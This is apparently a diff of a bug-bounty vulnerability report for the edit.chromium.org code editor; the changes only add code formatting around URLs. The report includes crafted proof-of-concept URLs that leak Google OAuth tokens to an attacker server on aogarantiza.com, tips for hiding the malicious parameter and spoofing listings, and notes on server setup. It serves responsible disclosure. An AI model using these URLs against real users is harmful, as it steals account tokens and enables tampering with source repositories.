@@ -202,20 +202,20 @@ If a user has previously authorized the "Android Build Team" OAuth app [1], only
 There are no other preconditions.
 
 # Reproduction case:
-PoC URL 1, sends creds to PoC server on https://aogarantiza.com:1338 (loads legitimate file and also spoofs directory listing): 
-https://edit.chromium.org/edit?repo=android/platform/build/&file=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%3Fhttps%3A%2F%2Faogarantiza.com%3A1338%23android.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2F
+PoC URL 1, sends creds to PoC server on `https://aogarantiza.com:1338` (loads legitimate file and also spoofs directory listing): 
+`https://edit.chromium.org/edit?repo=android/platform/build/&file=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%3Fhttps%3A%2F%2Faogarantiza.com%3A1338%23android.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2F`
 
 PoC URL 1 loads a file from a *.googlesource.com repo and populates the directory listing with attacker-controlled content (seems limited to text via `name` and a CSS class injection via `type`).
 
 Same as PoC URL 1 but with additional dummy params to obscure suspicious param in address bar:
-https://edit.chromium.org/edit?repo=android%2Fplatform%2Fbuild%2F&files=platform%2Fbuild%2Frefs%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md&project=android&theme=default&editmode=default&showfilelist=1&showsidebar=1&showfooter=1&quickstart=1&showfeedback=1&autosave=1&file=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%3Fhttps%3A%2F%2Faogarantiza.com%3A1338%23android.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2F
+`https://edit.chromium.org/edit?repo=android%2Fplatform%2Fbuild%2F&files=platform%2Fbuild%2Frefs%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md&project=android&theme=default&editmode=default&showfilelist=1&showsidebar=1&showfooter=1&quickstart=1&showfeedback=1&autosave=1&file=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%3Fhttps%3A%2F%2Faogarantiza.com%3A1338%23android.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2F`
 
-PoC URL 2, sends creds to PoC server on https://aogarantiza.com:1337 (does not spoof directory listing):
-https://edit.chromium.org/edit?file=https%3A%2F%2Fandroid.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%2Faogarantiza.com%3A1337%23android.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md
+PoC URL 2, sends creds to PoC server on `https://aogarantiza.com:1337` (does not spoof directory listing):
+`https://edit.chromium.org/edit?file=https%3A%2F%2Fandroid.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%2Faogarantiza.com%3A1337%23android.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md`
 
-PoC URL 3, sends creds to non-existent hostname: https://edit.chromium.org/edit?file=https%3A%2F%2Fandroid.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%2Fexample.example.example%23android.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md
+PoC URL 3, sends creds to non-existent hostname: `https://edit.chromium.org/edit?file=https%3A%2F%2Fandroid.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%2Fexample.example.example%23android.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md`
 
-NOTE: For PoC URL 1 or 2, we highly recommend using a test Google account, since the access token will be sent to https://aogarantiza.com:1337/1338 which is running the PoC server above. The PoC server will update the "About me" (status) field in Chromium Gerrit [2] but does not log the access token.
+NOTE: For PoC URL 1 or 2, we highly recommend using a test Google account, since the access token will be sent to `https://aogarantiza.com:1337/1338` which is running the PoC server above. The PoC server will update the "About me" (status) field in Chromium Gerrit [2] but does not log the access token.
 
 Setup if running PoC server yourself:
 Run attached server.js with NodeJS (provide your own privkey.pem and fullchain.pem; we generated it using Let’s Encrypt’s certbot). The server must run over HTTPS.
@@ -225,7 +225,7 @@ PoC, token sent to attacker server, OAuth app previously authorized scenario:
 Navigate to PoC URL 1 or 2. After page loads, a token is sent to the attacker’s PoC server.
 
 
-To demonstrate that the token has been stolen, the PoC server updates the user profile’s "About me" field in Chromium Gerrit [2]. To verify this, navigate to https://chromium-review.googlesource.com/settings/ while logged-in to the same Google account and observe the updated field.
+To demonstrate that the token has been stolen, the PoC server updates the user profile’s "About me" field in Chromium Gerrit [2]. To verify this, navigate to `https://chromium-review.googlesource.com/settings/` while logged-in to the same Google account and observe the updated field.
 
 PoC, token sent to attacker server, OAuth app not authorized scenario:
 Navigate to PoC URL 1 or 2.
@@ -234,7 +234,7 @@ Go through OAuth flow (select Google account if prompted, then click "Allow" for
 After auth is completed, a token is sent to the attacker’s PoC server.
 
 
-To demonstrate that the token has been stolen, the PoC server updates the user profile’s "About me" field in Chromium Gerrit [2]. To verify this, navigate to https://chromium-review.googlesource.com/settings/ while logged-in to the same Google account and observe the updated field.
+To demonstrate that the token has been stolen, the PoC server updates the user profile’s "About me" field in Chromium Gerrit [2]. To verify this, navigate to `https://chromium-review.googlesource.com/settings/` while logged-in to the same Google account and observe the updated field.
 
 PoC, observing DevTools Network tab:
 Open a new tab.
@@ -252,7 +252,7 @@ In cases where an attacker knows the victim is already authorized on edit.chromi
 
 # Impacts
 
-The scope of the leaked token is "email profile https://www.googleapis.com/auth/userinfo.profile openid https://www.googleapis.com/auth/gerritcodereview https://www.googleapis.com/auth/androidbuild.internal https://www.googleapis.com/auth/userinfo.email" (CLs may contain sensitive information, attacker could submit their own change as the victim, set victims display name to a duck emoji)
+The scope of the leaked token is `email profile https://www.googleapis.com/auth/userinfo.profile openid https://www.googleapis.com/auth/gerritcodereview https://www.googleapis.com/auth/androidbuild.internal https://www.googleapis.com/auth/userinfo.email` (CLs may contain sensitive information, attacker could submit their own change as the victim, set victims display name to a duck emoji)
 
 - View and manage your Git repositories
 - View and manage Internal Android Build status and results
@@ -265,7 +265,7 @@ mumbles something about software supply chain attacks being all the hotness righ
 With PoC URL 1, to obscure the attack the directory listing is spoofed to simulate a real directory listing, and a legitimate file is loaded. The directory listing contents can have any reasonable attacker-controlled text in it, although this is of limited use other than to avoid detection of attack.
 
 
-Other instances of the editor may also be affected by this bug. For example, the editor used in the PoC is at https://edit.chromium.org/edit, but the same editor appears to be hosted at https://ci.android.com/edit. There may be internal instances of the editor or other public instances we aren’t aware of.
+Other instances of the editor may also be affected by this bug. For example, the editor used in the PoC is at `https://edit.chromium.org/edit`, but the same editor appears to be hosted at `https://ci.android.com/edit`. There may be internal instances of the editor or other public instances we aren’t aware of.
 
 Access tokens may expire after a certain time period or can be revoked for other reasons.
 
